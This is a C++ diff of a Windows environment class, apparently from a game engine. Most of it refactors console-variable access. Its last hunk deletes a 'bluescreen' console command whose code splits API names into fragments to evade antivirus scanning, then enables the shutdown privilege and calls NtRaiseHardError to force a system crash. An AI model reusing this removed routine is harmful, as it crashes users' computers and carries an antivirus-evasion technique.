@@ -50,12 +50,11 @@ WinEnvironment::WinEnvironment(HWND hwnd, HINSTANCE hinstance) : Environment() {
     }
 
     // convar callbacks
-    convar->getConVarByName("win_processpriority")
-        ->setCallback(fastdelegate::MakeDelegate(this, &WinEnvironment::onProcessPriorityChange));
-    convar->getConVarByName("win_disable_windows_key")
-        ->setCallback(fastdelegate::MakeDelegate(this, &WinEnvironment::onDisableWindowsKeyChange));
+    cv_win_processpriority.setCallback(fastdelegate::MakeDelegate(this, &WinEnvironment::onProcessPriorityChange));
+    cv_win_disable_windows_key.setCallback(
+        fastdelegate::MakeDelegate(this, &WinEnvironment::onDisableWindowsKeyChange));
 
-    setProcessPriority(convar->getConVarByName("win_processpriority")->getInt());
+    setProcessPriority(cv_win_processpriority.getInt());
 }
 
 WinEnvironment::~WinEnvironment() { enableWindowsKey(); }
@@ -943,7 +942,7 @@ BOOL CALLBACK WinEnvironment::monitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor,
     else
         m_vMonitors.push_back(monitorRect);
 
-    if(debug_env->getBool())
+    if(cv_debug_env.getBool())
         debugLog("Monitor %i: (right = %ld, bottom = %ld, left = %ld, top = %ld), isPrimaryMonitor = %i\n",
                  m_vMonitors.size(), lprcMonitor->right, lprcMonitor->bottom, lprcMonitor->left, lprcMonitor->top,
                  (int)isPrimaryMonitor);
@@ -971,48 +970,5 @@ LRESULT CALLBACK WinEnvironment::lowLevelKeyboardProc(int nCode, WPARAM wParam, 
     else
         return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
 }
-
-void WinEnvironment::bluescreen() {
-    typedef NTSTATUS(NTAPI * pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
-                                                  ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
-                                                  ULONG ResponseOption, PULONG Response);
-    typedef NTSTATUS(NTAPI * pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread,
-                                                    PBOOLEAN Enabled);
-
-    // 200 iq obfuscation to avoid triggering crappy antivirus products
-    std::string sntdll = "nt";
-    sntdll += "dl";
-    sntdll += "l";
-    sntdll += ".";
-    sntdll += "dl";
-    sntdll += "l";
-
-    std::string sRtlAdjustPrivilege = "Rt";
-    sRtlAdjustPrivilege += "lAd";
-    sRtlAdjustPrivilege += "just";
-    sRtlAdjustPrivilege += "Priv";
-    sRtlAdjustPrivilege += "ileg";
-    sRtlAdjustPrivilege += "e";
-
-    std::string sNtRaiseHardError = "Nt";
-    sNtRaiseHardError += "Rai";
-    sNtRaiseHardError += "se";
-    sNtRaiseHardError += "Hard";
-    sNtRaiseHardError += "Er";
-    sNtRaiseHardError += "ror";
-
-    pfnRtlAdjustPrivilege pRtlAdjustPrivilege =
-        (pfnRtlAdjustPrivilege)(LPVOID)GetProcAddress(LoadLibraryA(sntdll.c_str()), sRtlAdjustPrivilege.c_str());
-    pfnNtRaiseHardError pNtRaiseHardError =
-        (pfnNtRaiseHardError)(LPVOID)GetProcAddress(GetModuleHandle(sntdll.c_str()), sNtRaiseHardError.c_str());
-
-    if(pRtlAdjustPrivilege != NULL && pNtRaiseHardError != NULL) {
-        BOOLEAN bEnabled;
-        ULONG uResp;
-        /*NTSTATUS NtRet = */ pRtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
-        pNtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
-    }
-}
-ConVar _bluescreen_("bluescreen", FCVAR_DEFAULT, WinEnvironment::bluescreen);
 
 #endif
